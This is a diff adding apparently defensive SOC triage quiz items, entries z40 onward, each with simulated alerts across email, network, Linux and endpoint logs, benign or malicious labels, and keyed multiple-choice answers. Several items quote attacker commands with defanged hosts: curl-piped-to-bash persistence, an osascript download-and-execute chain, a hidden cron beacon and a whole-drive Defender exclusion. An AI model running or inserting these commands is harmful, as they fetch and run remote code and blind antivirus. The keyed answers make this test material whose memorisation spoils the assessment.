+  v: 0
+  x: T1098.006
+  c: k8s-rbac-escalate
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'A cluster admin binding created by the Flux kustomize controller, applied from a manifest in the infra repo with an approved pull request.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude all flux-system service accounts', 'Exclude kustomize-controller for bindings that match the repo manifest', 'Exclude cluster-admin bindings during business hours']
+    a: 1
+    why: 'Tie it to the reviewed manifest; a stolen Flux token creating a new binding still fires.'
+  tell: 'cluster-admin bindings scream privilege escalation, but GitOps controllers (Flux/Argo) apply them from reviewed manifests. The binding is in the repo, PR-approved, applied by the controller. Trace it to Git before you escalate.'
+- id: z40
+  d: email
+  src: Exchange Online · OfficeActivity
+  t: Inbox rule created
+  h: ap-manager@corp.com
+  l: ['rule: moves mail with "invoice","wire","bank" to RSS Feeds then mark read', 'created: OWA from 41.x.x.x (new geo)', 'preceded by: risky sign-in 20 min earlier']
+  v: 1
+  x: T1564.008
+  c: mailbox-hide-rule
+  diff: 2
+  k: [0]
+  say: 'An accounts payable inbox rule moves mail mentioning invoice, wire or bank into RSS Feeds and marks it read. Created from a new country.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Delete the rule and close', 'Check sent items and vendor threads for fraudulent payment requests', 'Block the 41.x.x.x IP at the firewall']
+    a: 1
+    why: 'The rule hides fraud in flight. Find the payment ask before money moves.'
+  tell: 'A rule that sweeps invoice/wire/bank mail into RSS Feeds and marks it read is classic BEC — it hides the victim and the fraud team from each other. Keyword-hiding rule + a risky sign-in = compromised mailbox.'
+- id: z41
+  d: email
+  src: Exchange Online · OfficeActivity
+  t: Inbox rule created
+  h: jwells@corp.com
+  l: ['rule: "Newsletters" moves mail from mailchimp/substack to folder Reading', 'created: Outlook desktop, corp IP, compliant device', 'no preceding risky sign-in']
+  v: 0
+  x: T1564.008
+  c: mailbox-hide-rule
+  diff: 1
+  k: [0, 1]
+  say: 'An inbox rule called Newsletters moves Mailchimp and Substack mail into a Reading folder. Created in Outlook desktop on a compliant device.'
+  tell: 'People organize their inbox. A newsletter rule from the corp desktop on a compliant device, no risky sign-in behind it, is housekeeping. The scary cousin targets money keywords and dumps to a hidden folder.'
+- id: z42
+  d: email
+  src: Exchange Online · OfficeActivity
+  t: External forwarding configured
+  h: payroll-intake@corp.com
+  l: ['action: Set-Mailbox -ForwardingSmtpAddress intake@payroll-partner.com', 'actor: exch_admin (Exchange team) via EXO PowerShell, corp IP', 'ticket: CHG0045102 approved payroll outsourcing · vendor in TPRM · 90-day expiry set']
+  v: 0
+  x: T1114.003
+  c: external-forward
+  diff: 2
+  trap: scary
+  k: [2]
+  say: 'A shared payroll mailbox now forwards externally to a payroll partner. Set by an Exchange admin under an approved, vendor-vetted change with an expiry.'
+  tell: 'External auto-forward is a data-egress risk, but sometimes it is a sanctioned, time-boxed integration with a ticket, a vetted vendor and an expiry. Verify the approval and the end date rather than reflexively escalating.'
+- id: z43
+  d: email
+  src: M365 · Purview Audit (eDiscovery)
+  t: Content search exported across mailboxes
+  h: corp.com tenant
+  l: ['event: SearchExportDownloaded · scope: 220 mailboxes incl execs', 'actor: helpdesk_ana@corp.com · eDiscovery Manager role self-assigned 20 min earlier', 'case created and exported within 15 min, no legal hold']
+  v: 1
+  x: T1114.002
+  c: ediscovery-abuse
+  diff: 3
+  k: [1]
+  say: 'A help desk account, which gave itself the eDiscovery role twenty minutes ago, exports a search across two hundred twenty mailboxes, including executives.'
+  tell: 'eDiscovery is god-mode mail access. A helpdesk account that just granted itself the role, spinning up a case and exporting 220 mailboxes in 15 minutes, is mass collection, not legal work. Baseline who owns eDiscovery.'
+- id: z44
+  d: email
+  src: M365 · Purview Audit (eDiscovery)
+  t: Content search exported across mailboxes
+  h: corp.com tenant
+  l: ['event: SearchExportDownloaded · scope: 4 mailboxes', 'actor: legal_ediscovery@corp.com (eDiscovery Manager)', 'case: matter LIT-2026-038, legal hold active 3 weeks']
+  v: 0
+  x: T1114.002
+  c: ediscovery-abuse
+  diff: 2
+  k: [1, 2]
+  say: 'The legal eDiscovery manager exports a search of four mailboxes, tied to a litigation matter with a legal hold active for three weeks.'
+  tell: 'Same export event, but a legal eDiscovery manager pulling a scoped set tied to an active litigation matter is the tool doing its job. Role, scope, and a real case number separate discovery from theft.'
+- id: z45
+  d: email
+  src: Defender for Office · EmailEvents
+  t: Inbound message failed DMARC
+  h: 'To: ap-team@corp.com'
+  l: ['from: "CEO Dana Reed" <dana.reed@corp.com> · SPF fail, DKIM none, DMARC fail (p=quarantine overridden by allow-list)', 'reply-to: ceo.reed.urgent@gmail.com', 'body: urgent gift-card / wire request']
+  v: 1
+  x: T1684.002
+  c: dmarc-fail-spoof
+  diff: 1
+  k: [0, 1]
+  say: 'Mail from the CEO address at our own domain fails DMARC, with no DKIM. The reply-to is a Gmail address, asking for an urgent wire.'
+  tell: 'Exact-domain spoof of your own CEO, DMARC fail, reply-to swung to a Gmail, urgent money ask — and it only landed because an allow-list overrode quarantine. Fix the allow-list and escalate the attempt.'
+- id: z46
+  d: email
+  src: Defender for Office · EmailEvents
+  t: Inbound message failed DMARC
+  h: 'To: all-staff@corp.com'
+  l: ['from: news@benefitsco.com · SPF fail (new ESP not in SPF), DKIM pass d=esp-mailer.net (not aligned), DMARC fail', 'vendor: our benefits provider, 3-year relationship, same template as last 30 sends', 'links: resolve to benefitsco.com portal · no reply-to change']
+  v: 0
+  x: T1684.002
+  c: dmarc-fail-spoof
+  diff: 3
+  trap: scary
+  k: [1, 2]
+  say: 'All staff mail from the benefits vendor fails DMARC after they moved to a new mail platform. Same template, real portal links, no reply-to change.'
+  q:
+    kind: tune
+    ask: 'Best fix?'
+    o: ['Allow-list benefitsco.com to skip DMARC checks', 'Tell the vendor to add the ESP to SPF or sign DKIM as benefitsco.com', 'Lower our DMARC enforcement to p=none']
+    a: 1
+    why: 'Fix alignment at the source. Allow-lists are how exact-domain CEO spoofs land.'
+  tell: 'DMARC needs SPF or DKIM to pass AND align with the From domain. Here DKIM passes but is signed by the ESP, not the vendor, and SPF missed the new platform. Template, links and reply-to match history: misconfig, not a spoof. Tell the vendor to fix alignment.'
+- id: z47
+  d: email
+  src: Microsoft Teams · OfficeActivity
+  t: External federated chat with file
+  h: dborg@corp.com
+  l: ['external user: partner@trusted-vendor.com (allow-listed federation)', 'message: shared design.fig link to Figma', 'vendor on approved federation list, ongoing project channel']
+  v: 0
+  x: T1566.003
+  c: teams-external-phish
+  diff: 2
+  k: [0]
+  say: 'External Teams chat from an allow-listed partner tenant, sharing a Figma design link in an ongoing project channel.'
+  tell: 'External Teams chat is a real phishing vector (Storm-0324, DarkGate), but allow-listed federation with a known partner sharing a Figma link in an active project is collaboration. The tell for the bad kind is an unknown tenant pushing a .zip or a "setup" file.'
+- id: z48
+  d: network
+  src: DNS · Windows DNS analytic
+  t: High volume of unique subdomain queries to one domain
+  h: WS-ENG-0144 · bwalsh
+  l: ['queries: 1,900/hr · unique labels under *.sophosxl.net', 'labels: 40-char hex strings, high entropy, never repeat', 'process: SophosFileScanner.exe · signed · same pattern on all 4,000 endpoints']
+  v: 0
+  x: T1071.004
+  c: dns-tunnel-entropy
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Nineteen hundred queries an hour with unique hex labels to a Sophos domain. The querying process is the signed Sophos scanner, same on every endpoint.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude SophosFileScanner.exe querying *.sophosxl.net', 'Raise the entropy threshold for all domains', 'Exclude host WS-ENG-0144']
+    a: 0
+    why: 'Process + domain pair. A global threshold bump blinds you to real tunnels.'
+  tell: 'Unique high-entropy labels look like DNS tunneling, but AV reputation services look up file hashes encoded as DNS labels. Resolve the domain owner and the querying process. Signed AV to its own vendor domain, fleet-wide, is noise.'
+- id: z49
+  d: network
+  src: DNS · Windows DNS analytic
+  t: High volume of unique subdomain queries to one domain
+  h: WS-FIN-0233 · rowens
+  l: ['queries: 3,400/hr · TXT · unique labels under *.cdn-metrics.xyz (registered 9 days ago)', 'labels: long base32 strings, high entropy, never repeat', 'process: regsvr32.exe']
+  v: 1
+  x: T1071.004
+  c: dns-tunnel-entropy
+  diff: 2
+  k: [0, 2]
+  say: 'Thirty four hundred TXT queries an hour with unique encoded labels to a nine day old domain. The querying process is regsvr32.'
+  tell: 'Long high-entropy, never-repeating labels to a 9-day-old domain, queried by regsvr32, is data riding out over DNS TXT. Young domain + unique encoded labels + weird process = tunneling. Escalate.'
+- id: z50
+  d: network
+  src: Proxy · Zscaler (TLS inspected)
+  t: SNI and Host header mismatch
+  h: WS-MKT-0410 · asingh
+  l: ['SNI: cdn.jsdelivr.net · Host: fastly.jsdelivr.net', 'both names under the same registrable domain and the same certificate', 'client: Chrome, HTTP/2 connection reuse during normal browsing']
+  v: 0
+  x: T1090.004
+  c: domain-front-c2
+  diff: 3
+  trap: scary
+  k: [1]
+  say: 'TLS server name and HTTP host differ, but both are jsdelivr names on the same certificate, from Chrome reusing a connection.'
+  tell: 'Fronting needs the Host to be a different customer behind the shared CDN. Same registrable domain, one cert covering both, and HTTP/2 connection coalescing in Chrome = benign. Fronting puts an unrelated domain in Host behind a high-rep SNI.'
+- id: z51
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Periodic outbound connections at fixed interval
+  h: SRV-APP-11
+  l: ['dst: 20.x.x.x (Microsoft) :443 every 300s', 'bytes: steady ~2KB up/down · app: ssl', 'process (via XDR): MsSense.exe EDR cloud check-in']
+  v: 0
+  x: T1071.001
+  c: beacon-vs-telemetry
+  diff: 2
+  trap: scary
+  k: [2]
+  say: 'An app server connects every five minutes to a Microsoft IP, two kilobytes each way. The process is the Defender sensor checking in.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude all traffic to 20.0.0.0/8', 'Exclude signed MsSense.exe to Microsoft Defender endpoints', 'Exclude intervals of exactly 300s']
+    a: 1
+    why: 'Process + destination. Whole-ASN or interval exclusions hide C2 on Azure hosting.'
+  tell: 'Perfect-interval beacons look like C2, but EDR, update agents and monitoring all check in on a timer. Resolve the destination and the process: a security agent phoning its own cloud is supposed to be rhythmic.'
+- id: z52
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Sequential connections across many hosts
+  h: WS-ACCT-0412
+  l: ['one src → 254 dst IPs, dports 445/3389/22 in 90s', 'mostly resets/no-reply · src is a finance workstation', 'not in vuln-scan CMDB, no change window']
+  v: 1
+  x: T1046
+  c: internal-scan
+  diff: 2
+  k: [2]
+  say: 'A finance workstation sweeps two hundred fifty four internal IPs on SMB, RDP and SSH in ninety seconds. It is not a registered scanner.'
+  tell: 'A finance endpoint sweeping a /24 on SMB/RDP/SSH in 90 seconds is internal recon, not accounting. A workstation that is not a scanner has no reason to port-scan the subnet. Escalate the pivot.'
+- id: z53
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Sequential connections across many hosts
+  h: SRV-VM-02
+  l: ['one src → entire 10.30.0.0/16, full port ranges', 'src IP in CMDB: Qualys scanner appliance', 'schedule: authorized monthly scan window, change CHG0044990']
+  v: 0
+  x: T1046
+  c: internal-scan
+  diff: 1
+  k: [1]
+  say: 'One source sweeps an entire slash sixteen on all ports. The CMDB lists it as the Qualys scanner appliance, inside its monthly window.'
+  tell: 'The same scan pattern from the CMDB-registered Qualys appliance inside its approved window is your own vuln management. Baseline scanner IPs and windows or you will chase them forever.'
+- id: z54
+  d: network
+  src: Zeek · dns + ntlm logs
+  t: Host answering name-resolution broadcasts
+  h: WS-ENG-0088
+  l: ['10.10.5.44 answered 310 LLMNR/NBT-NS queries for names it does not own', 'followed by: 6 inbound NTLMv2 auths from other hosts to 10.10.5.44 SMB', 'host is a normal dev workstation, no admin role, not a DNS/WINS server']
+  v: 1
+  x: T1557.001
+  c: llmnr-poison
+  diff: 3
+  k: [0]
+  say: 'A dev workstation answers three hundred broadcast name lookups for names it does not own, then six other hosts send it NTLM logins.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Find which accounts sent NTLM to 10.10.5.44 and where they were relayed', 'Disable LLMNR by GPO and close', 'Re-image WS-ENG-0088 right away']
+    a: 0
+    why: 'Captured or relayed creds are the blast radius. GPO hardening comes after scoping.'
+  tell: 'A workstation answering LLMNR/NBT-NS broadcasts for names it does not own is poisoning name resolution to harvest NetNTLMv2 for relay or cracking. Normal endpoints never respond to these. Captured auths + a dev box = active AiTM.'
+- id: z55
+  d: network
+  src: Sentinel · SecurityEvent 5140
+  t: Many ADMIN$ share connections across hosts
+  h: SRV-DEPLOY-01
+  l: ['src connects to ADMIN$ on 300 hosts in 10 min', 'account: svc_sccm_push · source in CMDB: software-deploy server', 'change: monthly patch push window']
+  v: 0
+  x: T1021.002
+  c: smb-admin-context
+  diff: 2
+  trap: scary
+  k: [1]
+  say: 'One server opens ADMIN shares on three hundred hosts in ten minutes, using the SCCM push account from the registered deployment server.'
+  tell: 'Mass ADMIN$ connections look like lateral spread, but that is exactly how software deployment and patch tools work. The deploy service account from the deploy server in a push window is doing its job — baseline it.'
+- id: z56
+  d: network
+  src: Firewall · Palo Alto THREAT
+  t: Outbound connection to Tor entry node
+  h: LAB-VM-03
+  l: ['dst: 9001 to known Tor guard relay', 'src: 10.99.0.23 in segmented assessment VLAN', 'engagement: authorized assessment, ROE on file, egress allowed for this host']
+  v: 0
+  x: T1090.003
+  c: tor-egress
+  diff: 2
+  trap: scary
+  k: [2]
+  say: 'A lab VM connects to a Tor guard relay on port nine thousand one, from a segmented assessment VLAN listed in the rules of engagement.'
+  tell: 'Tor egress is almost always worth a look, but a segmented assessment host with an authorized engagement and documented ROE is sanctioned testing. Confirm the source is in-scope before you treat Tor as automatic evil.'
+- id: z57
+  d: linux
+  src: Linux · auditd
+  t: New systemd service unit created
+  h: web-prod-04 · www-data
+  l: ['path: /etc/systemd/system/cache-helper.service', 'exec: /bin/bash -c "curl -s hxxp://185.x.x.x/a|bash"', 'created by: www-data (web server user) after a POST to /upload.php']
+  v: 1
+  x: T1543.002
+  c: systemd-persist
+  diff: 2
+  k: [1, 2]
+  say: 'A new systemd service pipes curl from a raw IP into bash. It was written by the web server user right after an upload request.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Pull web logs and files for the /upload.php POST', 'Delete cache-helper.service and close', 'Block 185.x.x.x and close']
+    a: 0
+    why: 'The upload is the entry point. Find the webshell, or it rewrites the unit.'
+  tell: 'A service unit that curls a remote script into bash, written by www-data right after a file upload, is webshell-to-persistence. A web user should not be able to write units at all, so also hunt the privesc. Piping curl to bash = escalate.'
+- id: z58
+  d: linux
+  src: Linux · auditd
+  t: New systemd service unit created
+  h: app-prod-02 · root
+  l: ['path: /etc/systemd/system/node-exporter.service', 'ExecStart=/usr/local/bin/node_exporter', 'created by: ansible (via /usr/bin/python3), playbook run id logged']
+  v: 0
+  x: T1543.002
+  c: systemd-persist
+  diff: 2
+  k: [2]
+  say: 'A new node exporter systemd service pointing at its real binary, written by an Ansible run with a logged playbook ID.'
+  tell: 'Config management installs services for a living. A node_exporter unit written by an Ansible run, pointing at a real binary, with a playbook run id, is infra automation. Trace the writer and the ExecStart target.'
+- id: z59
+  d: linux
+  src: Linux · auditd
+  t: Cron entry added
+  h: db-prod-01 · postgres
+  l: ['file: /var/spool/cron/crontabs/postgres', 'entry: */5 * * * * /tmp/.x/beacon >/dev/null 2>&1', 'binary in hidden dir under /tmp, no package owner']
+  v: 1
+  x: T1053.003
+  c: cron-persist
+  diff: 2
+  k: [1, 2]
+  say: 'The postgres user crontab now runs a binary from a hidden folder under tmp every five minutes, output silenced.'
+  tell: 'A cron job running a binary out of a hidden /tmp directory every 5 minutes is a beacon on a timer. Hidden path + /tmp + no owning package = persistence. Legit cron points at managed paths.'
+- id: z60
+  d: linux
+  src: Linux · auditd
+  t: Cron entry added
+  h: app-prod-05 · root
+  l: ['file: /etc/cron.d/puppet-agent', 'entry: */30 * * * * root /opt/puppetlabs/bin/puppet agent --onetime', 'written by: puppet during catalog apply']
+  v: 0
+  x: T1053.003
+  c: cron-persist
+  diff: 1
+  k: [1]
+  say: 'A cron file runs the puppet agent from its install folder every thirty minutes. Puppet wrote it during a catalog apply.'
+  tell: 'Cron is the oldest persistence trick and the oldest admin tool. A puppet-agent entry in /etc/cron.d pointing at the real puppet binary is config management. The path and the writer tell you which it is.'
+- id: z61
+  d: linux
+  src: Linux · auditd
+  t: authorized_keys modified
+  h: bastion-01 · deploy
+  l: ['file: /home/deploy/.ssh/authorized_keys appended', 'new key comment: root@kali', 'preceded by: successful SSH password login from 103.x.x.x (foreign), first-seen IP']
+  v: 1
+  x: T1098.004
+  c: ssh-authkeys
+  diff: 2
+  k: [2]
+  say: 'An SSH key is appended for the deploy user on the bastion, right after a password login from a never-seen foreign IP.'
+  tell: 'Appending an SSH key is how you keep access after a password login. A new key added right after a foreign password-based login, comment root@kali, is the attacker nailing the door open. Escalate.'
+- id: z62
+  d: linux
+  src: Linux · auditd
+  t: authorized_keys modified
+  h: app-prod-07 · root
+  l: ['file: /root/.ssh/authorized_keys written at boot', 'writer: cloud-init (from instance user-data)', 'key matches the provisioning key in the golden image pipeline']
+  v: 0
+  x: T1098.004
+  c: ssh-authkeys
+  diff: 2
+  k: [1]
+  say: 'Root authorized keys written at first boot by cloud init, and the key matches the provisioning key from the image pipeline.'
+  tell: 'cloud-init writes authorized_keys on first boot from instance metadata — that is how cloud VMs get their SSH key. Writer is cloud-init at boot, key matches your pipeline = provisioning, not intrusion.'
+- id: z63
+  d: linux
+  src: Linux · auditd
+  t: Audit daemon configuration reloaded
+  h: app-prod-03 · root
+  l: ['service auditd reload + augenrules --load', 'triggered by: ansible hardening playbook (CIS rules update)', 'rules count increased after reload, run id logged']
+  v: 0
+  x: T1685.004
+  c: disable-auditd
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Auditd reloaded by an Ansible hardening playbook. After the reload the audit rule count went up, not down.'
+  tell: 'An auditd reload pattern-matches "attacker disabling logging", but here the rule count went UP under a CIS hardening playbook. Reloading to add rules is the opposite of tampering. Check whether rules grew or vanished.'
+- id: z64
+  d: linux
+  src: Linux · Sysmon for Linux
+  t: Shell history disabled for session
+  h: ci-runner-11 · ci
+  l: ['export HISTFILE=/dev/null in /home/ci/.bashrc', 'account: ci (ephemeral build runner)', 'set by base image build, same across all runners']
+  v: 0
+  x: T1070.003
+  c: history-wipe
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Shell history sent to dev null in the bashrc of an ephemeral CI runner. The setting comes from the base image, same on every runner.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Suppress HISTFILE changes on all Linux hosts', 'Suppress HISTFILE=/dev/null in .bashrc for runner image hosts', 'Suppress the ci account everywhere']
+    a: 1
+    why: 'Scope to the image-baked file on runners; an interactive unset elsewhere still fires.'
+  tell: 'Disabling shell history reads as anti-forensics, but ephemeral CI runners null their HISTFILE by design in the base image. Same setting on every runner, baked into the image = intentional hygiene, not a cover-up. The malicious version is an interactive user unsetting it mid-session.'
+- id: z65
+  d: linux
+  src: Linux · auditd
+  t: Sensitive credential file read
+  h: files-prod-01 · backup
+  l: ['syscall: openat(/etc/passwd, O_RDONLY) · caller: rsync', 'no access to /etc/shadow or /etc/gshadow', 'rsync is the nightly backup job, maps uids to names']
+  v: 0
+  x: T1003.008
+  c: passwd-shadow-read
+  diff: 3
+  trap: scary
+  k: [1]
+  say: 'The nightly rsync backup reads the passwd file to map user IDs to names. It never touches the shadow file.'
+  tell: 'Reading /etc/passwd is normal — every uid-to-name lookup does it. The hashes live in /etc/shadow. A backup job reading passwd but never shadow is name resolution, not dumping. Watch for the shadow read.'
+- id: z66
+  d: edr
+  src: Defender for Endpoint · DeviceRegistryEvents
+  t: Real-time protection setting changed
+  h: SRV-TEST-14 · SYSTEM
+  l: ['reg: HKLM\...\Windows Defender\DisableRealtimeMonitoring = 1', 'applied via: GPO (security baseline for isolated test lab)', 'device in "Lab-NoAV" OU, offline segment']
+  v: 0
+  x: T1685
+  c: defender-change-writer
+  diff: 2
+  trap: scary
+  k: [1]
+  say: 'Defender real-time protection turned off on a test server, applied by group policy for an isolated lab OU on an offline segment.'
+  tell: 'Turning off RTP is a top EDR-tamper signal, but orgs legitimately disable AV on isolated malware-analysis/test segments via GPO. Device in the lab OU, change by GPO = policy. The scary one is a process doing it locally on a prod box.'
+- id: z67
+  d: edr
+  src: Defender for Endpoint · DeviceEvents
+  t: Antivirus exclusion path added
+  h: WS-SALES-0930 · tbrooks
+  l: ['cmd: Set-MpPreference -ExclusionPath C:\', 'added by: powershell.exe child of a macro-enabled doc', 'user is local admin (split token) · fodhelper UAC bypass preceded it']
+  v: 1
+  x: T1564.012
+  c: defender-change-writer
+  diff: 2
+  k: [1]
+  say: 'A Defender exclusion for the whole C drive, added by PowerShell spawned from a macro document, right after a UAC bypass.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Remove the exclusion and rescan', 'Find what landed on disk after the exclusion and the macro doc source', 'Remove tbrooks from local admins']
+    a: 1
+    why: 'The exclusion exists to hide a payload. Find the payload and the delivery first.'
+  tell: 'Excluding the entire C:\ drive blinds AV everywhere at once. Done by PowerShell spawned from a macro, after a UAC bypass = attacker clearing the runway. Whole-drive exclusions are never legitimate.'
+- id: z68
+  d: edr
+  src: Defender for Endpoint · AlertEvidence
+  t: EDR sensor stopped reporting
+  h: WS-OLD-0021 · SYSTEM
+  l: ['offboarding script run · Sense service stopped · device stops reporting', 'actor: SCCM task sequence "Decommission-Workstation" (svc_sccm)', 'device marked retired in CMDB, matching CHG ticket, disk wipe follows']
+  v: 0
+  x: T1685
+  c: sensor-uninstall
+  diff: 2
+  trap: scary
+  k: [2]
+  say: 'A workstation runs the Defender offboarding script and stops reporting. The CMDB marks it retired under a matching change, with a disk wipe next.'
+  tell: 'Sensor removal is scary until you see it is the decommission task sequence retiring the box, with a ticket and a wipe. EDR removal is a problem when the device stays alive and in use afterward.'
+- id: z69
+  d: edr
+  src: macOS · Unified Log (ESF)
+  t: Scripting utility spawned a network downloader
+  h: MBP-DESIGN-07 · agreen
+  l: ['cmd: osascript -e do shell script → curl -o /tmp/u hxxp://45.x.x.x/u', 'parent: a .app from ~/Downloads, unsigned, quarantine flag present', 'then: chmod +x /tmp/u && /tmp/u']
+  v: 1
+  x: T1059.002
+  c: macos-osascript
+  diff: 2
+  k: [0, 1]
+  say: 'An unsigned app from Downloads runs AppleScript that curls a file from a raw IP into tmp, marks it executable and runs it.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Delete /tmp/u and close', 'Block 45.x.x.x only', 'Isolate the Mac and rotate agreen browser, keychain and SSO creds']
+    a: 2
+    why: 'AMOS-style stealers grab keychain and cookies on first run. Assume creds are gone.'
+  tell: 'AppleScript shelling out to curl a payload into /tmp, launched by an unsigned quarantined app from Downloads, is a macOS infostealer pattern (think Atomic/AMOS). osascript + do shell script + curl to /tmp = escalate.'
+- id: z70
+  d: edr
+  src: macOS · Unified Log (ESF)
+  t: Quarantine attribute removed from downloaded file
+  h: MBP-ENG-12 · dpatel
+  l: ['xattr -d com.apple.quarantine ~/Downloads/zoom.pkg', 'run interactively by the user in Terminal', 'pkg is Developer ID signed and notarized (valid)']
+  v: 0
+  x: T1553.001
+  c: macos-gatekeeper
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'A user strips the quarantine flag from a Zoom installer in Terminal. The package is Developer ID signed and notarized.'
+  tell: 'Stripping com.apple.quarantine is a Gatekeeper bypass, but users and scripts do it to a notarized installer that Gatekeeper would have let run anyway. Signed + notarized = the real risk is low; the tell for malice is removing quarantine from an UNsigned binary.'
